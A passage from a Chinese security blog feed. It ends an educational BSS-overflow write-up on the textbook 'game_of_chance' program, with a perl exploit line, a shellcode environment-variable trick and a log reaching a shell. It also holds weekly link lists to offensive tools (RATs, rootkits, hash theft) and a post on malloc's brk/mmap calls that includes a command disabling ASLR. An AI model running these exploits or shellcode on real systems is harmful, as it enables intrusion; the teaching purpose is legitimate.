<li>因为只要有调用函数指针的操作就会触发jackpot函数，只要我们不退出，就可以无限刷金币,像是如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">perl -e &apos;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\xa5\x8c\x04\x08\n&quot; . &quot;1\n&quot; .&quot;y\n&quot;x10.  &quot;n\n5\nM0rk\n7\n&quot;&apos; | ./game_of_chance</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2018/03/22/BSS段的溢出攻击/getall.png" alt=""></p>
<ul>
<li>到这里可能有人会问那能不能getshell呢，答案是可以的，我们知道每个运行的程序都会加载环境变量，我们可以事先将shellcode写入到环境变量中，然后将跳转地址指向shellcode，就可以执行我们的shellcode了。getenvaddr用来获取SHELLCODE环境变量在程序运行时候所在的地址。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ echo $SHELLCODE</div><div class="line">��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�1�1ə��̀j</div><div class="line">                                                          XQh//shh/bin��Q��S��̀</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ ./getenvaddr SHELLCODE ./game_of_chance</div><div class="line">SHELLCODE will be at 0xbffff206</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ perl -e &apos;print &quot;1\n7\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x06\xf2\xff\xbf\n&quot; . &quot;1\n&quot;&apos; &gt; exploit_buff</div><div class="line">xxx@ubuntu:~/Desktop/pwntest/bssexploit$ cat exploit_buff - | ./game_of_chance </div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1260 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0x08048f15</div><div class="line"></div><div class="line">####### Pick a Number ######</div><div class="line">This game costs 10 credits to play. Simply pick a number</div><div class="line">between 1 and 20, and if you pick the winning number, you</div><div class="line">will win the jackpot of 100 credits!</div><div class="line"></div><div class="line">10 credits have been deducted from your account.</div><div class="line">Pick a number between 1 and 20: The winning number is 6</div><div class="line">Sorry, you didn&apos;t win.</div><div class="line"></div><div class="line">You now have 1250 credits</div><div class="line">Would you like to play again? (y/n)  -=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: M0rk]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">Change user name</div><div class="line">Enter your new name: Your name has been changed.</div><div class="line"></div><div class="line">-=[ Game of Chance Menu ]=-</div><div class="line">1 - Play the Pick a Number game</div><div class="line">2 - Play the No Match Dealer game</div><div class="line">3 - Play the Find the Ace game</div><div class="line">4 - View current high score</div><div class="line">5 - Change your user name</div><div class="line">6 - Reset your account at 100 credits</div><div class="line">7 - Quit</div><div class="line">[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���]</div><div class="line">[You have 1250 credits] -&gt;  </div><div class="line">[DEBUG] current_game pointer @ 0xbffff206</div><div class="line">id</div><div class="line">uid=1000(xxx) gid=1000(xxx) groups=1000(xxx),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="相关源码下载"><a href="#相关源码下载" class="headerlink" title="相关源码下载"></a>相关源码下载</h4><p><a href="https://github.com/kevien/exploitcode/tree/master/bssexploit" target="_blank" rel="external">github repo</a></p>
<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><ul>
<li>《Hacking the art of exploitation》0x342</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;缓冲区溢出除了典型的&lt;a href=&quot;https://kevien.github.io/2017/08/
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180319安全动态</title>
    <link href="http://kevien.github.io/2018/03/19/20180319%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/03/19/20180319安全动态/</id>
    <published>2018-03-19T05:17:36.000Z</published>
    <updated>2018-03-21T08:22:05.961Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>使用 Sysmon 和 Splunk 进行高级事件检测与威胁追查，来自 BotConf2016<br><a href="https://www.botconf.eu/wp-content/uploads/2016/11/PR12-Sysmon-UELTSCHI.pdf" target="_blank" rel="external">https://www.botconf.eu/wp-content/uploads/2016/11/PR12-Sysmon-UELTSCHI.pdf</a></li>
<li>RDP 劫持 - 如何透明地劫持 RDS 和 RemoteApp 会话以实现横向渗透<br><a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x68;&#116;&#x74;&#112;&#115;&#x3a;&#47;&#47;&#x6d;&#101;&#100;&#x69;&#117;&#109;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#64;&#110;&#101;&#116;&#119;&#x6f;&#x72;&#107;&#115;&#x65;&#x63;&#x75;&#114;&#x69;&#x74;&#x79;&#x2f;&#114;&#x64;&#x70;&#45;&#104;&#x69;&#106;&#97;&#99;&#107;&#x69;&#x6e;&#103;&#45;&#x68;&#111;&#119;&#45;&#x74;&#x6f;&#x2d;&#x68;&#x69;&#106;&#97;&#x63;&#x6b;&#45;&#114;&#100;&#115;&#45;&#97;&#x6e;&#x64;&#45;&#x72;&#x65;&#x6d;&#x6f;&#116;&#x65;&#x61;&#112;&#x70;&#x2d;&#115;&#x65;&#115;&#115;&#105;&#x6f;&#x6e;&#115;&#x2d;&#116;&#x72;&#x61;&#x6e;&#115;&#112;&#97;&#114;&#101;&#110;&#116;&#108;&#x79;&#45;&#x74;&#111;&#45;&#109;&#111;&#118;&#x65;&#x2d;&#116;&#x68;&#x72;&#x6f;&#117;&#x67;&#104;&#x2d;&#97;&#110;&#x2d;&#100;&#97;&#50;&#x61;&#x31;&#101;&#55;&#51;&#97;&#53;&#102;&#54;">&#x68;&#116;&#x74;&#112;&#115;&#x3a;&#47;&#47;&#x6d;&#101;&#100;&#x69;&#117;&#109;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#64;&#110;&#101;&#116;&#119;&#x6f;&#x72;&#107;&#115;&#x65;&#x63;&#x75;&#114;&#x69;&#x74;&#x79;&#x2f;&#114;&#x64;&#x70;&#45;&#104;&#x69;&#106;&#97;&#99;&#107;&#x69;&#x6e;&#103;&#45;&#x68;&#111;&#119;&#45;&#x74;&#x6f;&#x2d;&#x68;&#x69;&#106;&#97;&#x63;&#x6b;&#45;&#114;&#100;&#115;&#45;&#97;&#x6e;&#x64;&#45;&#x72;&#x65;&#x6d;&#x6f;&#116;&#x65;&#x61;&#112;&#x70;&#x2d;&#115;&#x65;&#115;&#115;&#105;&#x6f;&#x6e;&#115;&#x2d;&#116;&#x72;&#x61;&#x6e;&#115;&#112;&#97;&#114;&#101;&#110;&#116;&#108;&#x79;&#45;&#x74;&#111;&#45;&#109;&#111;&#118;&#x65;&#x2d;&#116;&#x68;&#x72;&#x6f;&#117;&#x67;&#104;&#x2d;&#97;&#110;&#x2d;&#100;&#97;&#50;&#x61;&#x31;&#101;&#55;&#51;&#97;&#53;&#102;&#54;</a></li>
<li>Protecting Against HSTS Abuse<br><a href="https://webkit.org/blog/8146/protecting-against-hsts-abuse/" target="_blank" rel="external">https://webkit.org/blog/8146/protecting-against-hsts-abuse/</a></li>
<li>Tokenvator - 操作 Windows Tokens 进行提权的工具<br><a href="https://github.com/0xbadjuju/Tokenvator" target="_blank" rel="external">https://github.com/0xbadjuju/Tokenvator</a></li>
<li>Defending Microsoft environments at scale，大规模 Microsoft 环境的防御方案<br><a href="https://drive.google.com/file/d/1QXjmlPRvfiRBnqzNpsTQo5bn0xKQoNc4/view" target="_blank" rel="external">https://drive.google.com/file/d/1QXjmlPRvfiRBnqzNpsTQo5bn0xKQoNc4/view</a></li>
<li>go-fuzz 使用指南，来自 GopherConRu 18 大会<br><a href="https://go-talks.appspot.com/github.com/dvyukov/go-fuzz/slides/fuzzing.slide" target="_blank" rel="external">https://go-talks.appspot.com/github.com/dvyukov/go-fuzz/slides/fuzzing.slide</a></li>
<li>十种进程注入技术介绍<br><a href="https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" target="_blank" rel="external">https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a></li>
<li>Internal-Monologue - 在不触碰 LSASS 的情况下抓取 NTLM Hashes 的攻击方式<br><a href="https://github.com/eladshamir/Internal-Monologue" target="_blank" rel="external">https://github.com/eladshamir/Internal-Monologue</a></li>
<li>滥用 LAPS 实现持久化控制<br><a href="https://rastamouse.me/2018/03/laps---part-2/" target="_blank" rel="external">https://rastamouse.me/2018/03/laps---part-2/</a></li>
<li>Pwn a ARM Router Step by Step<br><a href="https://xianzhi.aliyun.com/forum/topic/2184" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/2184</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;使用 Sysmon 和 Splunk 进行高级事件检测与威胁追查，来自 BotConf2016&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>malloc的系统调用</title>
    <link href="http://kevien.github.io/2018/03/18/malloc%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <id>http://kevien.github.io/2018/03/18/malloc的系统调用/</id>
    <published>2018-03-17T17:27:46.000Z</published>
    <updated>2018-03-19T04:52:22.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>在读这篇文章的时候你应该知道c语言的malloc是使用系统调用从操作系统申请内存的，这两个系统调用分别是<a href="http://man7.org/linux/man-pages/man2/sbrk.2.html" target="_blank" rel="external">brk</a>和<a href="http://man7.org/linux/man-pages/man2/mmap.2.html" target="_blank" rel="external">mmap</a>。<h4 id="prco-pid-maps文件"><a href="#prco-pid-maps文件" class="headerlink" title="/prco/$pid/maps文件"></a>/prco/$pid/maps文件</h4></li>
<li>先来简单看下这个文件，这个文件会显示整个进程的地址空间分布情况。<br><img src="/2018/03/18/malloc的系统调用/maps.png" alt=""><h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4></li>
<li>brk从内核获取内存是通过增加程序中断地址方式的，开始于start_brk,结束于brk，初始的时候两者都指向的是同一个位置。</li>
<li>当ASLR关闭的时候，start_brk和brk都是指向bss段的尾部的</li>
<li>当ASLR开启的时候，start_brk和brk初始位置是bss段的尾部加一个随机的偏移。<br><img src="/2018/03/18/malloc的系统调用/linuxFlexibleAddressSpaceLayout.png" alt=""><br>nice pic，ah</li>
<li>如上图虚拟内存地址空间分布图所示，start_brk即是堆空间的开始，brk即是堆空间的结束。</li>
<li><p>!注意，后面的测试均是关闭ASLR后测试输出，此外测试系统使用的是ubuntu14.04.1X64操作系统。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">关闭ASLR的方法</div><div class="line">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</div></pre></td></tr></table></figure>
</li>
<li><p>示例代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">/* sbrk and brk example */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        void *curr_brk, *tmp_brk = NULL;</div><div class="line"></div><div class="line">        printf(&quot;Welcome to sbrk example:%d\n&quot;, getpid());</div><div class="line"></div><div class="line">        /* sbrk(0) gives current program break location */</div><div class="line">        tmp_brk = curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program Break Location1:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        /* brk(addr) increments/decrements program break location */</div><div class="line">        brk(curr_brk+4096);</div><div class="line"></div><div class="line">        curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program break Location2:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        brk(tmp_brk);</div><div class="line"></div><div class="line">        curr_brk = sbrk(0);</div><div class="line">        printf(&quot;Program Break Location3:%p\n&quot;, curr_brk);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>输出分析：</p>
</li>
<li>在brk之前，我们可以看到是没有进程中是没有堆块的，因此 start_brk=brk=end_data=0x602000<br><img src="/2018/03/18/malloc的系统调用/brkbefore.png" alt=""></li>
<li>当程序执行brk调用的时候，如下的输出，我们看到有了堆块,因此 start_brk=end_data=0x602000,此时</li>
<li>start_brk=end_data=0x602000</li>
<li>brk = 0x603000<br><img src="/2018/03/18/malloc的系统调用/brkafter.png" alt=""></li>
<li>解释一下新增加的一行：这里602000-603000就是动态分配的地址空间，对应的操作权限标志是rw-p即可读可写不可执行，私有的</li>
<li>000000的文件偏移是因为没有映射任何的文件，00：00 是主要/次要的设备数-由于没有映射任何文件，所以这里也是0，最后的0是inode number，还是由于没有映射任何的文件，所以这里也还是0.<h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4></li>
<li><p>malloc使用<a href="https://elixir.bootlin.com/linux/v3.8/source/mm/mmap.c#L1285" target="_blank" rel="external">mmap</a>来创建一个私有的匿名映射块，私有的匿名映射块主要的目的就是分配新的内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">/* Private anonymous mapping example using mmap syscall */</div><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line"></div><div class="line">void static inline errExit(const char* msg)</div><div class="line">&#123;</div><div class="line">        printf(&quot;%s failed. Exiting the process\n&quot;, msg);</div><div class="line">        exit(-1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">        int ret = -1;</div><div class="line">        printf(&quot;Welcome to private anonymous mapping example::PID:%d\n&quot;, getpid());</div><div class="line">        printf(&quot;Before mmap\n&quot;);</div><div class="line">        getchar();</div><div class="line">        char* addr = NULL;</div><div class="line">        addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</div><div class="line">        if (addr == MAP_FAILED)</div><div class="line">                errExit(&quot;mmap&quot;);</div><div class="line">        printf(&quot;After mmap\n&quot;);</div><div class="line">        getchar();</div><div class="line"></div><div class="line">        /* Unmap mapped region. */</div><div class="line">        ret = munmap(addr, (size_t)132*1024);</div><div class="line">        if(ret == -1)</div><div class="line">                errExit(&quot;munmap&quot;);</div><div class="line">        printf(&quot;After munmap\n&quot;);</div><div class="line">        getchar();</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>输出分析：</p>
</li>
<li>在使用mmap之前：我们注意下面的一个内存地址段<br><img src="/2018/03/18/malloc的系统调用/mmapbefore.png" alt=""></li>
<li>当我们通过mmap申请了132KB的空间的时候，看到如下图<br><img src="/2018/03/18/malloc的系统调用/mmapafter.png" alt=""><br>b7df0000-b7e12000 其中这段虚拟内存地址就包含了我们刚刚申请到132KB大小的地址空间</li>
<li>其中b7df0000-b7e12000 是这个块的地址范围，对应的操作权限标志是rw-p即可读可写不可执行，私有的</li>
<li>000000的文件偏移是因为没有映射任何的文件，00：00 是主要/次要的设备数-由于没有映射任何文件，所以这里也是0，最后的0是inode number，还是由于没有映射任何的文件，所以这里也还是0.</li>
<li>当munmap之后，下面的输出我们可以看的到申请的内存被释放（变成原来的b7e11000-b7e12000），又交还给了操作系统。<br><img src="/2018/03/18/malloc的系统调用/aftermunmap.png" alt=""><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>在64位上brk和32的结果是相同的，但是mmap的会有不同，原因暂时不明。<h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4></li>
<li><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/" target="_blank" rel="external">Syscalls used by malloc.</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;在读这篇文章的时候你应该知道c语言的malloc是使用系统调用从操作系统申请内存的，这两个系统调用分别是
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180312安全动态</title>
    <link href="http://kevien.github.io/2018/03/12/20180312%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/03/12/20180312安全动态/</id>
    <published>2018-03-12T04:55:39.000Z</published>
    <updated>2018-03-17T15:26:04.270Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>Log every executed command to syslog (a.k.a. Snoopy Logger).<br><a href="https://github.com/a2o/snoopy" target="_blank" rel="external">https://github.com/a2o/snoopy</a></li>
<li>An information security preparedness tool to do adversarial simulation.<br><a href="https://github.com/uber-common/metta" target="_blank" rel="external">https://github.com/uber-common/metta</a></li>
<li>固件逆向介绍（Video）<br><a href="https://www.youtube.com/watch?v=GIU4yJn2-2A" target="_blank" rel="external">https://www.youtube.com/watch?v=GIU4yJn2-2A</a></li>
<li>ELF 二进制中的定向函数 Fuzzing<br><a href="https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/" target="_blank" rel="external">https://blahcat.github.io/2018/03/11/fuzzing-arbitrary-functions-in-elf-binaries/</a></li>
<li>Unix system calls<br><a href="http://t.cn/REkcu67" target="_blank" rel="external">http://t.cn/REkcu67</a><br><a href="http://t.cn/REkcu6g" target="_blank" rel="external">http://t.cn/REkcu6g</a></li>
<li>Sudohulk - 替换 sudo，利用 ptrace Hook execve 系统调用实现劫持<br><a href="https://github.com/hc0d3r/sudohulk" target="_blank" rel="external">https://github.com/hc0d3r/sudohulk</a></li>
<li>rootstealer - 检测 Linux 中的 root 用户终端并注入自定义命令<br><a href="https://github.com/CoolerVoid/rootstealer" target="_blank" rel="external">https://github.com/CoolerVoid/rootstealer</a></li>
<li><p>0d1n - 自动化 Web 安全扫描器<br><a href="https://github.com/CoolerVoid/0d1n" target="_blank" rel="external">https://github.com/CoolerVoid/0d1n</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c语言写的</div></pre></td></tr></table></figure>
</li>
<li><p>通过实践学习 Radare<br><a href="http://www.radare.org/get/THC2018.pdf" target="_blank" rel="external">http://www.radare.org/get/THC2018.pdf</a></p>
</li>
<li>Let’s Encrypt 宣布 ACME v2 和通配证书（wildcard）支持现已上线<br><a href="https://community.letsencrypt.org/t/acme-v2-and-wildcard-certificate-support-is-live/55579" target="_blank" rel="external">https://community.letsencrypt.org/t/acme-v2-and-wildcard-certificate-support-is-live/55579</a></li>
<li>vbg - 通过 X11 转发会话在 SSH 客户端上注入 Keystrokes 的工具<br><a href="https://github.com/xfee/vbg" target="_blank" rel="external">https://github.com/xfee/vbg</a></li>
<li>从 4.0.0 开始的所有版本的 Samba 存在认证用户修改任意用户密码的漏洞（CVE-2018-1050）<br><https: wiki.samba.org="" index.php="" cve-2018-1057=""></https:></li>
<li>CredSSP 存在严重漏洞(CVE-2018-0886)允许攻击者通过 MS-RDP 服务在服务器上远程执行代码（Video）<br><a href="https://blog.preempt.com/security-advisory-credssp" target="_blank" rel="external">https://blog.preempt.com/security-advisory-credssp</a></li>
<li>以 Firefox 做通信通道来绕过防火墙限制的探索<br><a href="https://medium.com/code-fighters/firefox-tunnel-to-bypass-any-firewall-bc6f8b432980" target="_blank" rel="external">https://medium.com/code-fighters/firefox-tunnel-to-bypass-any-firewall-bc6f8b432980</a></li>
<li>C 编译器生成只包含可打印字符的可执行文件(Paper)<br><a href="http://www.cs.cmu.edu/~tom7/abc/paper.pdf" target="_blank" rel="external">http://www.cs.cmu.edu/~tom7/abc/paper.pdf</a></li>
<li>打造 GSM 基站<br><a href="https://n0where.net/build-gsm-base-station" target="_blank" rel="external">https://n0where.net/build-gsm-base-station</a></li>
<li>使用 GDB 进行进程注入<br><a href="https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html" target="_blank" rel="external">https://magisterquis.github.io/2018/03/11/process-injection-with-gdb.html</a></li>
<li>通过伪装图标的 JS 快捷方式调用 UNC 路径窃取用户 NetNTLM Hash<br><a href="https://isc.sans.edu/forums/diary/Payload+delivery+via+SMB/23433/" target="_blank" rel="external">https://isc.sans.edu/forums/diary/Payload+delivery+via+SMB/23433/</a></li>
<li>uxss-db - UXSS 漏洞搜集仓库<br><a href="https://github.com/Metnew/uxss-db" target="_blank" rel="external">https://github.com/Metnew/uxss-db</a></li>
<li>DockerAttack - 渗透测试用的 Docker 镜像<br><a href="https://github.com/ZephrFish/DockerAttack" target="_blank" rel="external">https://github.com/ZephrFish/DockerAttack</a></li>
<li>getaltname - 从 SSL 证书中提取域名的工具<br><a href="https://github.com/franccesco/getaltname" target="_blank" rel="external">https://github.com/franccesco/getaltname</a></li>
<li>RAT-via-Telegram - 利用 Telegram 进行 C&amp;C 通信的 Windows 远程控制工具<br><a href="https://github.com/Dviros/RAT-via-Telegram" target="_blank" rel="external">https://github.com/Dviros/RAT-via-Telegram</a></li>
<li>Diamorphine - 适用于 Linux Kernels 2.6.x/3.x/4.x 内核的 LKM rootkit<br><a href="https://github.com/alex91ar/Diamorphine" target="_blank" rel="external">https://github.com/alex91ar/Diamorphine</a></li>
<li>Regaxor 正则表达式模糊测试工具介绍<br><a href="https://github.com/0xSobky/HackVault/wiki/Regaxor:-Fuzzing-Regexes-for-Fun-and-Not%E2%80%90So%E2%80%90Much-Profit" target="_blank" rel="external">https://github.com/0xSobky/HackVault/wiki/Regaxor:-Fuzzing-Regexes-for-Fun-and-Not%E2%80%90So%E2%80%90Much-Profit</a></li>
<li>arm_now - 帮助研究人员快速配置测试虚拟机的工具，支持多种 CPU 架构<br><a href="https://github.com/nongiach/arm_now" target="_blank" rel="external">https://github.com/nongiach/arm_now</a></li>
<li>lazyrecon - 渗透测试前期情报自动化收集工具<br><a href="https://github.com/nahamsec/lazyrecon" target="_blank" rel="external">https://github.com/nahamsec/lazyrecon</a></li>
<li>Linux Heap Exploitation Intro Series: Set you free()<br><a href="https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-set-you-free-part-1/" target="_blank" rel="external">https://sensepost.com/blog/2018/linux-heap-exploitation-intro-series-set-you-free-part-1/</a></li>
<li>使用 Webhooks 绕过支付<br><a href="http://lightningsecurity.io/blog/bypassing-payments-using-webhooks/" target="_blank" rel="external">http://lightningsecurity.io/blog/bypassing-payments-using-webhooks/</a></li>
<li>Microsoft checkedc: C 的扩展，向 C 中加入了边界检查<br><a href="https://github.com/Microsoft/checkedc" target="_blank" rel="external">https://github.com/Microsoft/checkedc</a></li>
<li>Cobalt Strike PowerShell Payload 混淆以绕过 Windows Defender 防御<br><a href="http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/" target="_blank" rel="external">http://www.offensiveops.io/tools/cobalt-strike-bypassing-windows-defender-with-obfuscation/</a></li>
<li>利用已签名程序 dvdplay.exe 做启动项的技巧<br><a href="http://www.hexacorn.com/blog/2018/03/15/beyond-good-ol-run-key-part-73/" target="_blank" rel="external">http://www.hexacorn.com/blog/2018/03/15/beyond-good-ol-run-key-part-73/</a></li>
<li>Powershell-RAT - 基于 Python 的后门程序，使用 Gmail 通过附件将数据泄露出去<br><a href="https://github.com/Viralmaniar/Powershell-RAT" target="_blank" rel="external">https://github.com/Viralmaniar/Powershell-RAT</a></li>
<li>区块链安全 - DAO攻击事件解析<br><a href="https://paper.seebug.org/544/" target="_blank" rel="external">https://paper.seebug.org/544/</a></li>
<li>区块链安全 - 以太坊短地址攻击<br><a href="https://paper.seebug.org/545/" target="_blank" rel="external">https://paper.seebug.org/545/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Log every executed command to syslog (a.k.a. Sno
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180305安全动态</title>
    <link href="http://kevien.github.io/2018/03/05/20180305%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/03/05/20180305安全动态/</id>
    <published>2018-03-05T05:27:54.000Z</published>
    <updated>2018-03-09T05:48:54.896Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>编写 Bash 自动补全脚本<br><a href="https://iridakos.com/tutorials/2018/03/01/bash-programmable-completion-tutorial.html" target="_blank" rel="external">https://iridakos.com/tutorials/2018/03/01/bash-programmable-completion-tutorial.html</a></li>
<li>使用 IDA Pro 和 X64dbg 逆向分析 Gootkit 恶意软件<br><a href="https://www.youtube.com/watch?v=242Tn0IL2jE&amp;;feature=youtu.be" target="_blank" rel="external">https://www.youtube.com/watch?v=242Tn0IL2jE&amp;;feature=youtu.be</a></li>
<li>C++ STL 库错误用法的检测<br><a href="https://kristerw.blogspot.se/2018/03/detecting-incorrect-c-stl-usage.html" target="_blank" rel="external">https://kristerw.blogspot.se/2018/03/detecting-incorrect-c-stl-usage.html</a></li>
